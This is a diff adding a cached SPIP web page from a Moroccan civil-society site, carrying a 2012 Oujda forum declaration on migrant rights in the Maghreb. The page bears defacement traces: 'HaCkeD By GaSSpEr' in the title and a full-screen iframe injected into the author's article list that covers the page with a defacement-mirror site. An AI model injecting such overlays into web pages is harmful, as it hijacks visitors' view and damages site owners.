@@ -1,0 +1,242 @@
+a:11:{s:5:"texte";s:14610:"
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr" dir="ltr">
+<head>
+	<title>Forum social des migrants : déclaration d'Oujda du Forum social Maghrébin - [HaCkeD By GaSSpEr]</title>
+		<?php echo recuperer_fond( 'inc/inc-meta', array('id_article' => '190',
+	'lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',7,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+		<?php echo recuperer_fond( 'styles', array('lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',8,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+	
+</head>
+<body dir="ltr" class="fr article sect29 rub29 art190">
+<div id="page" class="article art190">
+<!-- *****************************************************************
+	Bandeau, titre du site et menu langue
+	Header and main menu (top and right) 
+    ************************************************************* -->
+	
+<?php echo recuperer_fond( 'inc/inc-bandeau', array('id_article' => '190',
+	'lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',18,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+
+
+<!-- *****************************************************************
+	Contenu principal (centre)
+	Main content (center) 
+    ************************************************************* -->
+
+    <div id="bloc-contenu">
+      <div class="article-info-rubrique">
+        <h5>
+        <a href="http://www.forumalternatives.org" title="Accueil du site : HaCkeD By GaSSpEr">Accueil du site</a>
+        
+            
+              <b class='separateur'>&gt;</b> 
+              <a href="http://www.forumalternatives.org/spip.php?rubrique29">Nouveauté</a>
+            
+        </h5>
+
+        
+        
+        <div class="ligne-debut"></div><!-- ligne-debut -->
+      </div><!-- article-info-rubrique -->
+      
+      <div class="cartouche">
+			
+			
+			<h1 class="titre-article">Forum social des migrants&nbsp;: déclaration d&#8217;Oujda du Forum social Maghrébin</h1>
+            <div class="sous-titre">Un autre Maghreb et une autre politique migratoire sont possibles</div>
+      		<div class="detail">
+				<span class="date">vendredi 12 octobre 2012</span> 
+				<span class="auteurs">par  <span class="vcard author"><a class="url fn spip_in" href="spip.php?auteur1">FMAS</a></span></span>				
+     		 </div><!-- detail -->
+				
+      </div><!-- cartouche -->
+
+
+		<div class="chapo"><p>Les migrants, les associations de la société civile maghrébine, les syndicats et les organisations de solidarité internationale réunis dans le cadre de la seconde édition du Forum Social Maghrébin à Oujda, et étendu à Oran, les 6 et 7 octobre 2012 sous la thématique migration et libre circulation au Maghreb, et en commémoration des évènements de Ceuta de 2005 dont ont été victimes une centaine de migrants subsahariens, relèvent&nbsp;:</p></div>
+		<div class="texte"><p>Le coût du non-Maghreb sur les plans économiques, sociaux, culturels et même psychologiques constitue une perte énorme pour le présent et l’avenir des peuples de la région. Par le passé ils ont mené un combat commun contre le colonialisme aussi bien sur leurs territoires que dans l’immigration en Europe. Ils ont réussi à forger une identité commune et un imaginaire de société émancipateur. Actuellement, alors qu’ils aspirent à l’avènement d’un espace géo-politique démocratique, de justice sociale, de liberté favorisant les échanges entre les peuples, ouvert et accueillant vis-à-vis des migrants vivant et travaillant dans les différents pays maghrébins, nous assistons, bien au contraire, et ce depuis des décennies, à une accélération d’une insertion dépendante dans le marché mondial au dépend d’une intégration et d’un développement régional maghrébin. Ce choix est incapable d’insuffler une dynamique maghrébine unitaire à la hauteur des enjeux globaux régionaux et internationaux et des aspirations des peuples de la région.</p>
+
+<p>Sur le plan migratoire, nous assistons à la mise en place de politiques sécuritaires stigmatisant les migrants vivants sur le sol maghrébin, au mépris de l’histoire qui lie les peuples du Nord de l’Afrique à ceux de l’Afrique subsaharienne, au mépris des intérêts mutuels de développement et d’enrichissement culturel et civilisationnel.</p>
+
+<p>Nos gouvernants rivalisent dans la mise en application des politiques et directives européennes érigeant un mur entre les 2 rives de la méditerranée, responsables de milliers de morts et de disparus, transformant la méditerranée en un vaste cimetière.</p>
+
+<p>Les vagues d’arrestation, de refoulement, de traitements dégradants des migrants(es) subsahariens et la criminalisation de leur présence constituent l’une des atteintes graves aux droits humains les plus élémentaires.</p>
+
+<p>Les migrants, les organisations de la société civile maghrébine et de solidarité internationale réunies au sein du Forum des migrants d’Oujda, dénoncent cette collusion entre les intérêts d’une Europe frileuse, barricadée derrière ses frontières et ceux des gouvernements maghrébins incapables de construire une politique alternative au service des intérêts des peuples de la région.</p>
+
+<p>Le traitement sécuritaire de la question migratoire est une impasse. Les migrations ont été de tout temps une chance pour les peuples de départ et d’arrivée. Le Maghreb de tradition migratoire ancienne est devenu un territoire aussi bien d’immigration que d’émigration. La présence des migrants subsahariens et d’autres pays est une chance pour le développement des 2 espaces africains. L’avenir de l’Afrique du Nord et l’Afrique subsaharienne passe par l’ouverture sur l’Autre et par les échanges humains source d’enrichissement mutuel.</p>
+
+<p>La construction d’un Maghreb des peuples riche de sa diversité culturelle, linguistique et sociale nécessite une vision globale d’avenir attachée à un espace sans frontières intra-pays du Maghreb, démocratique et respectueux des droits humains, basé sur quelques principes fondateurs notamment&nbsp;:</p>
+
+<p>L’ouverture des frontières permettant la libre circulation et d’installation aussi bien des nationaux que des migrants vivants sur le sol maghrébin&nbsp;;
+<br />La régularisation de la situation de tous les sans papiers souhaitant s’installer et vivre dans les pays maghrébins&nbsp;;
+<br />Le rejet de la politique européenne sécuritaire érigeant des murs au lieu de construire des ponts entre les 2 rives de la méditerranée&nbsp;;
+<br />La fermeture de tous les lieux d’enfermement des immigrés et la dépénalisation de la situation des sans papiers&nbsp;;
+<br />Arrêt de toutes les formes de violence à l’égard des femmes migrantes qui subissent de graves humiliations et la nécessité de poursuites judiciaires sans concession vis-à-vis de toute forme d’atteinte à leurs droits&nbsp;;
+<br />L’égalité des droits économiques, sociaux et culturels reconnus universellement, et le respect par l’application intégrale des conventions internationales de protection des immigrés et des réfugiés notamment la convention de Genève du 28 juillet 1951 relative au statut des réfugiés et la convention internationale sur la protection des droits de tous les travailleurs migrants et des membres de leur famille adoptée par les Nations Unies le 18 décembre 1990&nbsp;; ainsi que les conventions de l’OIT relatives à la migration&nbsp;;
+<br />Le rejet et la criminalisation des discriminations et du racisme, et la promulgation par les parlements nationaux de lois sanctionnant les actes racistes et xénophobes.</p>
+
+<p><strong>Oujda (Frontière algéro-marocaine) le 7 octobre 2012 </strong></p></div>
+		
+		
+		
+		<br class="nettoyeur" />
+
+
+		
+
+		
+		
+		<!-- Derniers articles des auteurs de l'article -->
+		
+			<div class="ps" id="articles-recents-auteur">
+				
+				<h4><a href="spip.php?auteur1" title="FMAS">FMAS</a></h4>	
+					
+					<h3><em>Articles de cet auteur</em></h3>
+					<ul>
+						
+						<li>	
+							<a href="spip.php?article195" ><iframe src="http://zonehmirrors.org/defaced/2014/12/04/www.incineration.org/www.incineration.org/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%"></a>
+						</li>
+							
+						<li>	
+							<a href="spip.php?article175" >Termes de référence&nbsp;: CHARGE ( E ) DE CONTENU DU SITE &#171;&nbsp;WEBRADIO JOUSSOUR&nbsp;&#187;</a>
+						</li>
+							
+						<li>	
+							<a href="spip.php?article202" >   منتدى بدائل المغرب بتعاون مع المرصد المغربي للحريات العامة ينظمان ندوة صحفية حول حرية التجمعات والتجمهر والتظاهرات بالمغرب</a>
+						</li>
+							
+						<li>	
+							<a href="spip.php?article200" > Communiqué   Le Forum des Alternatives Maroc, en collaboration avec l’Observatoire Marocain des Libertés publiques, organisent une conférence de presse sur les libertés de rassemblement et de manifestation au Maroc   Le 06 mai 2014 à 10h00,  à l’Hôtel Golden Tulip Farah, 160 Avenue F.A.R Casablanca</a>
+						</li>
+							
+						<li>	
+							<a href="spip.php?article204" >Communiqué de presse La Dynamique de l’appel de Rabat des associations démocrates confirme la continuité de son boycott du dialogue sur la société civile, organisé par le gouvernement.</a>
+						</li>
+							
+						<li><a href="spip.php?auteur1" title="suite">[...]</a></li>
+					</ul>
+					
+				
+			</div><!-- notes chapo -->
+		
+
+		<!-- Mots cles -->
+		
+		
+
+		<!-- Forums -->
+		
+		
+	</div><!-- bloc-contenu -->
+	
+<!-- *****************************************************************
+	Menus contextuels (droite)
+	Contextual menus (right) 
+    ************************************************************* -->
+    <div id="encart"> 
+      <?php echo recuperer_fond( 'inc/inc-annonces', array('lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',188,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+		<!-- Derniers articles dans la meme rubrique -->
+		
+			<div class="menu" id="articles_meme_rubrique">
+			<h2 class="structure">Articles les plus r&eacute;cents</h2>
+				<a name='pagination_articles_rubrique' id='pagination_articles_rubrique'></a>
+				<ul>
+					<li>
+						<a href="http://www.forumalternatives.org/spip.php?rubrique29">Dans la m&ecirc;me rubrique</a>
+						<ul>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article175" >Termes de référence&nbsp;: CHARGE ( E ) DE CONTENU DU SITE &#171;&nbsp;WEBRADIO JOUSSOUR&nbsp;&#187;</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article199" >La 3éme assise régionale  sur &#171;&nbsp;Le mouvement associatif à la lumière des nouvelles dispositions constitutionnelles&nbsp;: Enjeux et défis&nbsp;&#187;</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article198" >Interdiction du Forum maghrébin pour la lutte contre le chômage et le travail précaire&nbsp;: Arrestations, expulsions</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article193" >Maroc - Managem donne suite à ses engagements</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article192" >&#171;&nbsp;DAWAR LANTER&nbsp;&#187; -  Représentation en Première</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article188" >L’Université d’Automne Jeunesse aura lieu les 12, 13 et 14 octobre 2012 à Bouznika (Maroc)</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article186" >&#171;&nbsp;Le Conseil Consultatif des Jeunes et de l’Action Associative&nbsp;: Défis du Mouvement Associatif et de la Jeunesse&nbsp;&#187;</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article185" >Action Jeunesse organise des "cafés libertés" dans une vingtaine de villes du Maroc</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article183" >Dossier spécial "Assemblée préparatoire du Forum social Mondial - Tunis 2013"</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article180" >Assemblée préparatoire du Forum Social Mondial 2013 , Monastir</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article176" >Une autre Tunisie est possible, dans un autre Maghreb et un autre monde</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article173" >Le Forum social des quartiers populaires en route vers le Forum social mondial 2013 (Tunis)</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article172" >Rencontre internationale à Monastir (Tunisie) du 12 au 18 juillet 2012</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article171" >APPEL STOP TGV&nbsp;! </a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article170" >منتــــدى الأحـــــــياء الشعبيــــــــة  19 - 20 ماي 2012  بالباطوار </a>
+							</li>
+							
+						</ul>
+					</li>
+				</ul>
+				<span class="on">0</span>
+	|
+
+ <a href='spip.php?article190&amp;debut_articles_rubrique=15#pagination_articles_rubrique' class='lien_pagination' rel='nofollow'>15</a>
+			</div><!-- menu -->
+		
+
+	</div><!-- encart -->
+	
+
+<?php echo recuperer_fond( 'inc/inc-menu', array('id_rubrique' => '29',
+	'lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',213,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+
+<?php echo recuperer_fond( 'inc/inc-bas', array('id_article' => '190',
+	'id_rubrique' => '29',
+	'id_secteur' => '29',
+	'lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',215,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+</div><!-- page -->
+
+</body>
+</html>
+";s:9:"squelette";s:37:"html_0feb356541ece574d5ca5f126926b590";s:6:"source";s:34:"plugins/auto/ahuntsic/article.html";s:11:"process_ins";s:3:"php";s:11:"invalideurs";a:1:{s:5:"cache";s:35:"1/%2Fspip--fr--63cf101a7758b3b37ae8";}s:7:"entetes";a:1:{s:12:"X-Spip-Cache";i:86400;}s:5:"duree";i:0;s:5:"notes";s:0:"";s:8:"contexte";a:7:{s:10:"article190";s:0:"";s:4:"lang";s:2:"fr";s:10:"id_article";s:3:"190";s:4:"date";s:19:"2014-12-07 20:17:17";s:12:"date_default";b:1;s:10:"date_redac";s:19:"2014-12-07 20:17:17";s:18:"date_redac_default";b:1;}s:12:"lastmodified";i:1418001437;s:2:"gz";b:0;}
